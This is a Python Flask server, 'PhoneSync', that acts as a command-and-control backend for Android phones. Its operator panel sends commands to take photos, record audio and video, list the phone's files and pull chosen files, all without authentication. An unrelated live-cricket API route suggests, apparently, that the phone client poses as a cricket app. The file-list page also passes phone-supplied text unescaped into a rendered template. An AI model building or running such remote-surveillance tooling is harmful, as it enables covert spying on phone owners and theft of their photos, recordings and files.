import os
import json
import sqlite3
from datetime import datetime
from pathlib import Path

import requests
from flask import Flask, jsonify, request, send_from_directory, render_template_string, url_for

app = Flask(__name__)

BASE_DIR = Path(__file__).resolve().parent
UPLOAD_DIR = BASE_DIR / "uploads"
DB_PATH = BASE_DIR / "database.db"

UPLOAD_DIR.mkdir(parents=True, exist_ok=True)

MAX_UPLOAD_SIZE = 500 * 1024 * 1024  # 500 MB


# ============================================================
# DATABASE
# ============================================================

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db()

    conn.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command TEXT NOT NULL,
            created_at TEXT NOT NULL
        )
    """)

    conn.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_name TEXT,
            device_info TEXT,
            created_at TEXT NOT NULL
        )
    """)

    conn.execute("""
        CREATE TABLE IF NOT EXISTS mobile_files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            path TEXT NOT NULL,
            name TEXT,
            size INTEGER DEFAULT 0,
            modified TEXT,
            device_name TEXT,
            created_at TEXT NOT NULL
        )
    """)

    conn.commit()
    conn.close()


init_db()


# ============================================================
# HELPERS
# ============================================================

def now():
    return datetime.utcnow().isoformat(timespec="seconds")


def save_command(command):
    conn = get_db()
    conn.execute(
        "INSERT INTO commands (command, created_at) VALUES (?, ?)",
        (command, now())
    )
    conn.commit()
    conn.close()


def get_latest_command():
    conn = get_db()
    row = conn.execute(
        "SELECT id, command, created_at FROM commands ORDER BY id DESC LIMIT 1"
    ).fetchone()
    conn.close()
    return row


# ============================================================
# BASIC SERVER ROUTES
# ============================================================

@app.route("/")
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>PhoneSync Server</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {
                font-family: Arial, sans-serif;
                background: #f5f7fb;
                margin: 0;
                padding: 30px;
                color: #111827;
            }
            .box {
                max-width: 700px;
                margin: auto;
                background: white;
                padding: 30px;
                border-radius: 18px;
                box-shadow: 0 10px 30px rgba(0,0,0,.08);
            }
            h1 { margin-top: 0; }
            a {
                display: block;
                margin: 12px 0;
                color: #2563eb;
                text-decoration: none;
                font-weight: 600;
            }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>PhoneSync Server</h1>
            <p>Server is running successfully.</p>

            <a href="/health">Health</a>
            <a href="/control">Phone Control</a>
            <a href="/files">Uploaded Files</a>
            <a href="/mobile_files">Phone File List</a>
        </div>
    </body>
    </html>
    """


@app.route("/health")
def health():
    return jsonify({
        "status": "ok",
        "service": "PhoneSync Server",
        "time": now()
    })


# ============================================================
# DEVICE REGISTRATION
# ============================================================

@app.route("/register", methods=["POST"])
def register():
    data = request.get_json(silent=True) or {}

    device_name = data.get("device_name", "Android Device")
    device_info = json.dumps(data)

    conn = get_db()
    conn.execute(
        """
        INSERT INTO devices (device_name, device_info, created_at)
        VALUES (?, ?, ?)
        """,
        (device_name, device_info, now())
    )
    conn.commit()
    conn.close()

    return jsonify({
        "success": True,
        "message": "Device registered",
        "device_name": device_name
    })


@app.route("/login", methods=["POST"])
def login():
    data = request.get_json(silent=True) or {}

    return jsonify({
        "success": True,
        "message": "Login accepted",
        "device_name": data.get("device_name", "Android Device")
    })


# ============================================================
# COMMAND SYSTEM
# ============================================================

@app.route("/send_command", methods=["POST"])
def send_command():
    data = request.get_json(silent=True) or {}
    command = str(data.get("command", "")).strip()

    if not command:
        return jsonify({
            "success": False,
            "error": "Missing command"
        }), 400

    save_command(command)

    return jsonify({
        "success": True,
        "command": command
    })


@app.route("/send_command_ui", methods=["POST"])
def send_command_ui():
    command = request.form.get("command", "").strip()

    if not command:
        return "Missing command", 400

    save_command(command)

    return jsonify({
        "success": True,
        "command": command
    })


@app.route("/get_command", methods=["GET"])
def get_command():
    row = get_latest_command()

    if row is None:
        return jsonify({
            "command": "",
            "id": 0
        })

    return jsonify({
        "command": row["command"],
        "id": row["id"],
        "created_at": row["created_at"]
    })


# ============================================================
# FILE UPLOAD FROM ANDROID
# ============================================================

@app.route("/upload", methods=["POST"])
def upload():
    if "file" not in request.files:
        return jsonify({
            "success": False,
            "error": "No file field received"
        }), 400

    uploaded_file = request.files["file"]

    if not uploaded_file.filename:
        return jsonify({
            "success": False,
            "error": "Empty filename"
        }), 400

    filename = Path(uploaded_file.filename).name
    destination = UPLOAD_DIR / filename

    # Avoid overwriting an existing file.
    if destination.exists():
        stem = destination.stem
        suffix = destination.suffix
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{stem}_{timestamp}{suffix}"
        destination = UPLOAD_DIR / filename

    uploaded_file.save(destination)

    return jsonify({
        "success": True,
        "filename": filename,
        "size": destination.stat().st_size
    })


# ============================================================
# UPLOADED FILES
# ============================================================

@app.route("/files")
def files():
    images = []
    audio = []
    videos = []
    other = []

    for path in sorted(
        UPLOAD_DIR.iterdir(),
        key=lambda p: p.stat().st_mtime if p.exists() else 0,
        reverse=True
    ):
        if not path.is_file():
            continue

        name = path.name
        ext = path.suffix.lower()

        if ext in [".jpg", ".jpeg", ".png", ".webp", ".gif"]:
            images.append(name)
        elif ext in [".m4a", ".mp3", ".wav", ".aac", ".ogg", ".flac"]:
            audio.append(name)
        elif ext in [".mp4", ".mkv", ".avi", ".mov", ".webm"]:
            videos.append(name)
        else:
            other.append(name)

    def make_list(items, title):
        html = f"<h2>{title}</h2>"

        if not items:
            html += "<p>No files.</p>"
            return html

        html += "<ul>"

        for filename in items:
            safe_name = filename.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            html += f"""
                <li style="margin:12px 0;">
                    <strong>{safe_name}</strong>
                    &nbsp;
                    <a href="/view/{filename}">View</a>
                    &nbsp;
                    <a href="/download/{filename}">Download</a>
                </li>
            """

        html += "</ul>"
        return html

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>PhoneSync Files</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {
                font-family: Arial, sans-serif;
                background: #f5f7fb;
                padding: 20px;
            }
            .box {
                max-width: 900px;
                margin: auto;
                background: white;
                padding: 25px;
                border-radius: 18px;
                box-shadow: 0 8px 25px rgba(0,0,0,.08);
            }
            a {
                color: #2563eb;
                text-decoration: none;
            }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>PhoneSync Uploaded Files</h1>
    """

    html += make_list(images, "Images")
    html += make_list(videos, "Videos")
    html += make_list(audio, "Audio")
    html += make_list(other, "Other Files")

    html += """
            <p><a href="/">← Back</a></p>
        </div>
    </body>
    </html>
    """

    return render_template_string(html)


@app.route("/view/<path:filename>")
def view_file(filename):
    return send_from_directory(
        UPLOAD_DIR,
        filename,
        as_attachment=False
    )


@app.route("/download/<path:filename>")
def download_file(filename):
    return send_from_directory(
        UPLOAD_DIR,
        filename,
        as_attachment=True
    )


# ============================================================
# PHONE FILE LIST
# ============================================================

@app.route("/filelist", methods=["POST"])
def receive_file_list():
    data = request.get_json(silent=True) or {}

    files_data = data.get("files", [])
    device_name = data.get("device_name", "Android Device")

    if not isinstance(files_data, list):
        return jsonify({
            "success": False,
            "error": "files must be a list"
        }), 400

    conn = get_db()

    # Replace the previous file list for this device.
    conn.execute(
        "DELETE FROM mobile_files WHERE device_name = ?",
        (device_name,)
    )

    for item in files_data:
        if not isinstance(item, dict):
            continue

        conn.execute(
            """
            INSERT INTO mobile_files
            (path, name, size, modified, device_name, created_at)
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            (
                str(item.get("path", "")),
                str(item.get("name", "")),
                int(item.get("size", 0) or 0),
                str(item.get("modified", "")),
                device_name,
                now()
            )
        )

    conn.commit()
    conn.close()

    return jsonify({
        "success": True,
        "received": len(files_data)
    })


@app.route("/mobile_files", methods=["GET"])
def mobile_files():
    conn = get_db()

    rows = conn.execute(
        """
        SELECT id, path, name, size, modified, device_name, created_at
        FROM mobile_files
        ORDER BY name COLLATE NOCASE
        """
    ).fetchall()

    conn.close()

    return jsonify([
        {
            "id": row["id"],
            "path": row["path"],
            "name": row["name"],
            "size": row["size"],
            "modified": row["modified"],
            "device_name": row["device_name"],
            "created_at": row["created_at"]
        }
        for row in rows
    ])


@app.route("/mobile_files_view", methods=["GET"])
def mobile_files_view():
    conn = get_db()

    rows = conn.execute(
        """
        SELECT id, path, name, size, modified, device_name
        FROM mobile_files
        ORDER BY name COLLATE NOCASE
        """
    ).fetchall()

    conn.close()

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Phone Files</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {
                font-family: Arial, sans-serif;
                background: #f5f7fb;
                padding: 20px;
            }
            .box {
                max-width: 1200px;
                margin: auto;
                background: white;
                padding: 20px;
                border-radius: 16px;
                overflow-x: auto;
            }
            table {
                width: 100%;
                border-collapse: collapse;
            }
            th, td {
                text-align: left;
                padding: 10px;
                border-bottom: 1px solid #ddd;
            }
            th {
                background: #f1f5f9;
            }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>Phone Files</h1>
            <table>
                <tr>
                    <th>Name</th>
                    <th>Path</th>
                    <th>Size</th>
                    <th>Modified</th>
                    <th>Device</th>
                </tr>
    """

    for row in rows:
        html += f"""
            <tr>
                <td>{row["name"]}</td>
                <td>{row["path"]}</td>
                <td>{row["size"]}</td>
                <td>{row["modified"]}</td>
                <td>{row["device_name"]}</td>
            </tr>
        """

    html += """
            </table>
            <p><a href="/">← Back</a></p>
        </div>
    </body>
    </html>
    """

    return render_template_string(html)


# ============================================================
# REQUEST A PHONE FILE
# ============================================================

requested_file = ""


@app.route("/request_mobile_file", methods=["POST"])
def request_mobile_file():
    global requested_file

    requested_file = request.form.get("path", "").strip()

    if not requested_file:
        return jsonify({
            "success": False,
            "error": "Missing path"
        }), 400

    save_command("request_file:" + requested_file)

    return jsonify({
        "success": True,
        "path": requested_file
    })


@app.route("/request_file", methods=["POST"])
def request_file_json():
    global requested_file

    data = request.get_json(silent=True) or {}
    requested_file = str(data.get("path", "")).strip()

    if not requested_file:
        return jsonify({
            "success": False,
            "error": "Missing path"
        }), 400

    save_command("request_file:" + requested_file)

    return jsonify({
        "success": True,
        "path": requested_file
    })


@app.route("/get_requested_file", methods=["GET"])
def get_requested_file():
    global requested_file

    result = requested_file
    requested_file = ""

    return jsonify({
        "path": result
    })


# ============================================================
# CRICKET LIVE API
# ============================================================

@app.route("/api/live_matches", methods=["GET"])
def live_matches():
    api_key = os.getenv("CRICKET_API_KEY", "").strip()

    if not api_key:
        return jsonify({
            "success": False,
            "error": "CRICKET_API_KEY is not configured on the server",
            "data": []
        }), 500

    url = "https://api.cricapi.com/v1/currentMatches"

    try:
        response = requests.get(
            url,
            params={
                "apikey": api_key,
                "offset": 0
            },
            timeout=15
        )

        response.raise_for_status()

        cricket_data = response.json()

        return jsonify(cricket_data)

    except requests.RequestException as exc:
        return jsonify({
            "success": False,
            "error": f"Cricket API request failed: {exc}",
            "data": []
        }), 502

    except ValueError:
        return jsonify({
            "success": False,
            "error": "Cricket API returned invalid JSON",
            "data": []
        }), 502




@app.route("/api/latest_photo")
def latest_photo_api():
    image_exts = {".jpg", ".jpeg", ".png", ".webp", ".gif"}
    photos = [p for p in UPLOAD_DIR.iterdir() if p.is_file() and p.suffix.lower() in image_exts]
    if not photos:
        return jsonify({"success": True, "available": False})
    photo = max(photos, key=lambda p: p.stat().st_mtime)
    return jsonify({
        "success": True,
        "available": True,
        "filename": photo.name,
        "modified": photo.stat().st_mtime,
        "url": url_for("view_file", filename=photo.name, _external=True),
        "download_url": url_for("download_file", filename=photo.name, _external=True),
    }), 200, {"Cache-Control": "no-store"}

# ============================================================
# CONTROL PANEL
# ============================================================

COMMANDS = [
    ("photo_request", "Take Photo"),
    ("start_audio", "Start Audio"),
    ("stop_audio", "Stop Audio"),
    ("start_video", "Start Video"),
    ("stop_video", "Stop Video"),
    ("get_files", "Get Phone Files"),
    ("open_chrome", "Open Chrome"),
    ("open_youtube", "Open YouTube"),
    ("open_whatsapp", "Open WhatsApp"),
    ("open_instagram", "Open Instagram"),
]


@app.route("/control", methods=["GET"])
def control():
    buttons = ""
    for command, label in COMMANDS:
        buttons += '<button class="cmd" onclick="sendCommand(\'%s\', this)">%s</button>' % (command, label)

    html = """
    <!DOCTYPE html>
    <html>
    <head>
      <title>PhoneSync Control</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
        body { font-family: Arial, sans-serif; background:#f3f4f6; margin:0; padding:25px; color:#111827; }
        .box { max-width:1100px; margin:auto; background:white; padding:28px; border-radius:20px; box-shadow:0 10px 30px rgba(0,0,0,.08); }
        .cmd { border:0; border-radius:10px; padding:13px 17px; background:#111827; color:white; cursor:pointer; font-size:15px; margin:5px; }
        .cmd:hover { opacity:.85; }
        .cmd:disabled { opacity:.55; cursor:wait; }
        .small { border:0; border-radius:8px; padding:8px 12px; background:#2563eb; color:white; cursor:pointer; }
        hr { margin:25px 0; border:0; border-top:1px solid #ddd; }
        .photo-box { min-height:250px; background:#f8fafc; border-radius:15px; padding:20px; text-align:center; }
        #latestPhoto { max-width:100%; max-height:500px; border-radius:12px; object-fit:contain; }
        table { width:100%; border-collapse:collapse; margin-top:15px; }
        th,td { padding:10px; border-bottom:1px solid #ddd; text-align:left; }
        th { background:#f1f5f9; }
        .links a { display:inline-block; margin-right:20px; margin-top:15px; color:#2563eb; text-decoration:none; }
        .status { margin-top:12px; font-weight:600; }
      </style>
    </head>
    <body>
      <div class="box">
        <h1>PhoneSync Control</h1>
        <p>Control your authorized Android device over HTTPS.</p>
        <div id="commandButtons">__BUTTONS__</div>
        <div id="commandStatus" class="status"></div>
        <hr>
        <h2>Latest Phone Photo</h2>
        <div class="photo-box">
          <div id="photoMessage">Checking for a photo...</div>
          <img id="latestPhoto" style="display:none" alt="Latest phone photo">
          <p><a id="photoDownload" style="display:none" target="_blank">Download Photo</a></p>
        </div>
        <hr>
        <h2>Phone Files</h2>
        <div id="phoneFiles">Loading phone files...</div>
        <div class="links">
          <a href="/files">Uploaded Files</a>
          <a href="/mobile_files_view">Phone Files Page</a>
          <a href="/api/live_matches">Live Cricket API</a>
          <a href="/">← Home</a>
        </div>
      </div>
      <script>
        async function sendCommand(command, button) {
          const originalText = button.innerText;
          const status = document.getElementById('commandStatus');
          button.disabled = true;
          button.innerText = 'Sending...';
          status.textContent = '';
          try {
            const body = new URLSearchParams();
            body.append('command', command);
            const response = await fetch('/send_command_ui', {
              method: 'POST',
              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
              body: body.toString()
            });
            if (!response.ok) throw new Error('Server returned HTTP ' + response.status);
            const data = await response.json();
            if (!data.success) throw new Error(data.error || 'Command failed');
            status.textContent = 'Command sent: ' + command;
            if (command === 'photo_request') {
              button.innerText = 'Photo Requested';
              setTimeout(refreshPhoto, 3000);
              setTimeout(refreshPhoto, 6000);
              setTimeout(refreshPhoto, 10000);
            }
            if (command === 'get_files') {
              button.innerText = 'Scanning Phone...';
              setTimeout(refreshFiles, 3000);
              setTimeout(refreshFiles, 7000);
            }
          } catch (e) {
            console.error(e);
            status.textContent = 'Error: ' + e.message;
            alert('Command failed: ' + e.message);
          } finally {
            setTimeout(() => {
              button.disabled = false;
              button.innerText = originalText;
            }, 4000);
          }
        }

        async function refreshPhoto() {
          try {
            const r = await fetch('/api/latest_photo?ts=' + Date.now(), {cache:'no-store'});
            if (!r.ok) throw new Error('Photo API HTTP ' + r.status);
            const d = await r.json();
            const img = document.getElementById('latestPhoto');
            const msg = document.getElementById('photoMessage');
            const dl = document.getElementById('photoDownload');
            if (d.available) {
              img.src = d.url + '?ts=' + Date.now();
              img.style.display = 'inline-block';
              msg.style.display = 'none';
              dl.href = d.download_url;
              dl.style.display = 'inline';
            } else {
              img.style.display = 'none';
              dl.style.display = 'none';
              msg.textContent = 'No photo received yet. Click Take Photo.';
              msg.style.display = 'block';
            }
          } catch (e) {
            console.error(e);
            document.getElementById('photoMessage').textContent = 'Unable to load photo.';
          }
        }

        function esc(v) {
          return String(v).replaceAll('&','&amp;').replaceAll('<','&lt;').replaceAll('>','&gt;').replaceAll('"','&quot;').replaceAll("'",'&#039;');
        }

        async function refreshFiles() {
          try {
            const r = await fetch('/mobile_files?ts=' + Date.now(), {cache:'no-store'});
            if (!r.ok) throw new Error('File API HTTP ' + r.status);
            const d = await r.json();
            const files = Array.isArray(d) ? d : (d.files || []);
            const c = document.getElementById('phoneFiles');
            if (!files.length) {
              c.innerHTML = '<p>No phone files received yet. Click <b>Get Phone Files</b>.</p>';
              return;
            }
            let h = '<table><tr><th>Name</th><th>Path</th><th>Size</th><th>Action</th></tr>';
            for (const f of files) {
              const mb = (Number(f.size || 0) / 1048576).toFixed(2);
              h += '<tr><td>' + esc(f.name || '') + '</td><td>' + esc(f.path || '') + '</td><td>' + mb + ' MB</td>';
              h += '<td><button class="small" onclick="requestFile(this)" data-path="' + encodeURIComponent(f.path || '') + '">Download</button></td></tr>';
            }
            c.innerHTML = h + '</table>';
          } catch (e) {
            console.error(e);
            document.getElementById('phoneFiles').textContent = 'Unable to load phone files.';
          }
        }

        async function requestFile(btn) {
          const path = decodeURIComponent(btn.dataset.path || '');
          if (!path) return;
          btn.disabled = true;
          btn.innerText = 'Requesting...';
          try {
            const body = new URLSearchParams();
            body.append('path', path);
            const r = await fetch('/request_mobile_file', {
              method:'POST',
              headers:{'Content-Type':'application/x-www-form-urlencoded'},
              body:body.toString()
            });
            const d = await r.json();
            alert(d.success ? 'File request sent to the Android phone.' : (d.error || 'Request failed.'));
          } catch (e) {
            alert('File request failed: ' + e.message);
          } finally {
            btn.disabled = false;
            btn.innerText = 'Download';
          }
        }

        refreshPhoto();
        refreshFiles();
        setInterval(refreshPhoto, 3000);
        setInterval(refreshFiles, 5000);
      </script>
    </body>
    </html>
    """
    return html.replace('__BUTTONS__', buttons)

# ============================================================
# ERROR HANDLERS
# ============================================================

@app.errorhandler(413)
def request_entity_too_large(error):
    return jsonify({
        "success": False,
        "error": "Uploaded file is too large"
    }), 413


# ============================================================
# SERVER CONFIG
# ============================================================

app.config["MAX_CONTENT_LENGTH"] = MAX_UPLOAD_SIZE


if __name__ == "__main__":
    port = int(os.getenv("PORT", "5000"))
    app.run(
        host="0.0.0.0",
        port=port,
        debug=False
    )
